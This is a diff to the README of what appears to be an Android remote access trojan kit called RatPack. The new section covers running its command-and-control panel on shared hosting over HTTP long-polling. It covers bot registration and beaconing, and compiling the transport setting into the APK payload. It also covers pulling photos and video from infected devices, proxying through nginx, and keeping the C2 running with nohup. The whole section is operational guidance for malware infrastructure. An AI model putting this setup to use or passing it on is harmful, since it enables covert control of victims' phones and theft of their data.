@@ -228,6 +228,122 @@ wizard and is **not** in the repository — keep it out of version control.
 
 ---
 
+## Shared hosting / shared hardware
+
+The default transport is a raw TCP socket: the server binds a port and the
+bots connect to it. That needs a box where you control the ports — a VPS, a
+home server, a container with published ports.
+
+On **shared hosting** (cPanel/Plesk, Heroku-style dynos, Cloudflare-fronted
+boxes) you usually cannot bind a port and have the outside world reach it.
+You only get HTTP(S) on the port the platform assigns.
+
+For that case the server offers an **HTTP long-polling transport**: the bot
+polls for commands over ordinary HTTP and posts its frames back. Same
+protocol, same panel, only the framing around the frames differs.
+
+```
+POST /bot/register        the bot announces itself
+POST /bot/poll/{id}       long poll: returns a command, or 204 after the timeout
+POST /bot/send/{id}       the bot returns a response or an event
+```
+
+### Choosing it
+
+Run the wizard and pick option 2 for the transport:
+
+```
+  [1] Direct TCP   the server owns a port, bots connect straight to it
+  [2] HTTP         shared hosting: the bots poll the panel over HTTP
+```
+
+Then give it the **public URL** of your panel, for example
+`https://rat.example.com` — not `host:port`, and not `0.0.0.0`.
+
+`setting.json` then carries it to the compiler:
+
+```json
+"server": {
+  "host": "https://rat.example.com",
+  "port": 8777,
+  "protocol": "tcp",
+  "transport": "http",
+  "secret": "..."
+}
+```
+
+The compiler bakes `transport: http` into the APK, and the payload switches
+itself to the HTTP client.
+
+### What it costs
+
+- One long-poll request per bot per interval instead of one persistent
+  socket. With the default 15 s beacon that is 4 requests a minute per bot.
+- The poll holds a worker thread for the duration of the poll, so keep the
+  poll timeout close to the beacon interval and cap the number of bots.
+- Media-heavy commands (a photo, a video) are transferred as base64 inside
+  the JSON response, which is much larger than the binary would be. Pulling
+  files over HTTP is noticeably slower than over TCP.
+
+### Running behind a reverse proxy
+
+Any reverse proxy that can proxy HTTP works — nginx, Caddy, Apache. The
+panel is a normal ASGI application.
+
+```nginx
+server {
+    listen 443 ssl http2;
+    server_name rat.example.com;
+
+    location / {
+        proxy_pass http://127.0.0.1:8080;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+
+        # The long poll must not be cut off before it answers.
+        proxy_read_timeout 120s;
+    }
+}
+```
+
+If the proxy terminates TLS, the payload should talk to the public
+`https://` URL. The panel's own TLS certificate is not what the bot sees in
+that case — the proxy's is, and the payload trusts the system CA store plus
+user-installed certificates.
+
+### Process supervision on shared hosting
+
+Shared hosting usually has no systemd. Run the panel under whatever the
+platform provides — a supervisor config, a screen/tmux session, or the
+hosting provider's "always-on worker" feature:
+
+```bash
+cd ~/RatPack-Server
+./venv/bin/python -m ratpack.run
+```
+
+For a persistent background process without systemd:
+
+```bash
+nohup ./venv/bin/python -m ratpack.run >> ~/ratpack.log 2>&1 &
+```
+
+### Running the bot interface only
+
+If you only want the C2 and not the browser panel, pick option 1 in the
+wizard and start with:
+
+```bash
+python3 -m ratpack.botd
+```
+
+That one has no HTTP surface at all, so it also works where the panel
+itself is not permitted.
+
+---
+
 # The protocol
 
 The bot channel is a plain TCP (optionally TLS) stream with a 6-byte header:
